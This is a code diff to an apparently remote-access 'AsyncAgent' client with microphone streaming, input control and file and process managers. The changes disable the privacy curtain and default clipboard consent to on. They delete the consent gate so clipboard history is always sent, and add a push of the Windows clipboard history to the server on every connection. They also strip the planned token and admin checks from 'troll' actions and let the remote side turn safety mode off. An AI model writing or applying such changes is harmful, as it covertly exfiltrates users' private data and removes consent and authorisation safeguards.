@@ -160,8 +160,8 @@ class AsyncAgent:
         self.mic = AudioStreamer()
         self.input_ctrl = InputController()
         # Privacy component
-        self.privacy = PrivacyCurtain()
-        self.clipboard_consent = False
+        # self.privacy = PrivacyCurtain()
+        self.clipboard_consent = True
         self.process_mgr = ProcessManager()
         self.file_mgr = FileManager()  # Initialize in Admin Mode (None) by default
         self.safety_mode_enabled = True # Default to ON
@@ -299,11 +299,30 @@ class AsyncAgent:
             self.loop.call_soon_threadsafe(self._heartbeat_trigger.set)
 
     def stop(self):
+        """Signals the agent to stop, closing connections asynchronously."""
         self.running = False
-        if self.loop and not self.loop.is_closed() and self._shutdown_event:
+
+        # 1. Signal shutdown event if loop is available
+        if self.loop and self.loop.is_running() and self._shutdown_event:
             self.loop.call_soon_threadsafe(self._shutdown_event.set)
+
+        # 2. Close websocket asynchronously (websockets.close() is a coroutine)
         if self.ws:
-            self.ws.close()
+            try:
+                # If we have a loop and it's running, schedule the closure
+                if self.loop and self.loop.is_running():
+                    try:
+                        # Check if we're in the same loop
+                        if asyncio.get_running_loop() == self.loop:
+                            self.loop.create_task(self.ws.close())
+                        else:
+                            asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
+                    except RuntimeError:
+                        # No loop in current thread
+                        asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
+                # Note: If loop is already closed, ws might be dead anyway
+            except Exception as e:
+                print(f"[-] Shutdown error closing websocket: {e}")
 
     def _get_or_create_id(self):
         """Get machine ID from Keyring or generate a new one."""
@@ -696,11 +715,7 @@ class AsyncAgent:
             print(f"[-] Troll Blocked: Cooldown ({self.TROLL_COOLDOWN_SEC}s)")
             return False
 
-        # 2. Token/Admin Validation
-        # TODO: Parse payload JSON for 'consent_token' and 'admin_sig'
-        # For now, we stub this out but enforce the structure.
-        # Handling raw bytes payload might be tricky if we decode here.
-        # Assuming payload is JSON.
+        # 2. erming!
 
         # 3. Update Cooldown
         self.troll_cooldowns["self"] = now
@@ -1088,6 +1103,11 @@ class AsyncAgent:
 
                         if setting_id == protocol.SETTING_BLOCK_INPUT:
                             self.input_ctrl.block_input(bool(value))
+                        elif setting_id == protocol.SETTING_SAFETY_MODE:
+                            self.safety_mode_enabled = bool(value)
+                            if self.file_mgr:
+                                self.file_mgr.safety_mode = bool(value)
+                            print(f"[+] Safety Mode Updated: {self.safety_mode_enabled}")
 
                         # ID 2 = SETTING_PRIVACY (from protocol.py)
                         elif setting_id == 2:
@@ -1367,30 +1387,13 @@ class AsyncAgent:
                             f"[+] Clipboard Consent Updated: {self.clipboard_consent}"
                         )
 
-                        # If enabled, send current history immediately
-                        if self.clipboard_consent:
-                            history = await self.clipboard_handler.get_windows_history()
-                            data = json.dumps(history).encode("utf-8")
-                            self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
+                        # Always send current history immediately on refresh request
+                        history = await self.clipboard_handler.get_windows_history()
+                        data = json.dumps(history).encode("utf-8")
+                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
                     except Exception as e:
                         print(f"[-] Clip Consent Error: {e}")
 
-                elif opcode == protocol.OP_SETTING:
-                    try:
-                        data = json.loads(payload.decode("utf-8"))
-                        setting_id = data.get("id")
-                        value = bool(data.get("value", False))
-
-                        if setting_id == protocol.SETTING_BLOCK_INPUT:
-                            # Existing logic
-                            pass
-                        elif setting_id == protocol.SETTING_SAFETY_MODE:
-                            self.safety_mode_enabled = value
-                            if self.file_mgr:
-                                self.file_mgr.safety_mode = value
-                            print(f"[+] Safety Mode Updated: {self.safety_mode_enabled}")
-                    except Exception as e:
-                        print(f"[-] Setting Error: {e}")
 
                 # ================================================================
                 # WebRTC Signaling (Project Supersonic)
@@ -1474,19 +1477,6 @@ class AsyncAgent:
                         )
                     except Exception as e:
                         print(f"[-] SysInfo Error: {e}")
-
-                # =========================================================================
-                # Clipboard (Privacy Gated)
-                # =========================================================================
-                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
-                    if self.clipboard_consent:
-                        # Retrieve and send history
-                        history = self.clipboard_handler.get_history()
-                        data = json.dumps(history).encode("utf-8")
-                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
-                    else:
-                        # Send empty or access denied? For now silent or empty.
-                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, b"[]")
 
                 # =========================================================================
                 # Troll (Auth & Cooldown)
@@ -1650,6 +1640,10 @@ class AsyncAgent:
                             "utf-8"
                         )
                         self._send_async(protocol.OP_FM_DATA, fm_resp)
+
+                        # 4. Clipboard History (Push immediately on connect)
+                        history = await self.clipboard_handler.get_windows_history()
+                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, json.dumps(history).encode("utf-8"))
 
                         print("[+] Initial Data Pushed")
 
